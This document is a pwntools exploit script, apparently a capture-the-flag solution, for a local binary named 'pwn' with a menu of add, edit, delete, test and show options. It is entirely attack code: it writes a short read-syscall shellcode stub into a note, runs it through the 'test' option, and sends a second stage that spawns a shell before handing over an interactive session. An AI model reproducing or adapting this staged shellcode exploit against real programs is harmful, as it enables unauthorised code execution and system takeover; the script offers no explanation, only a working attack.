from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'6.Exit\nChoice : '
def add(idx):
	sla(menu, b'1')
	sla(b'Index? : ', byte(idx))

def edit(idx, content):
	sla(menu, b'2')
	sla(b'Index? : ', byte(idx))
	sla(b'iNput:', content)

def dele(idx):
	sla(menu, b'3')
	sla(b'Index? : ', byte(idx))

def test(idx):
	sla(menu, b'4')
	sla(b'Index? : ', byte(idx))
	

def show(idx):
	sla(menu, b'5')
	sla(b'Index? : ', byte(idx))

sla(b'Name:', b'XiaozaYa')
sla(b'Make your Choice:', byte(64424509440))

shellcode = asm(
'''
	xor rdi, rdi
	mov rsi, rdx
	mov rdx, 0x200
	syscall
'''
)
print(shellcode)
print(hex(len(shellcode)))

add(0) 
edit(0, shellcode)
test(0)
shellcode = shellcode + asm(shellcraft.sh())
sl(shellcode)
sh()
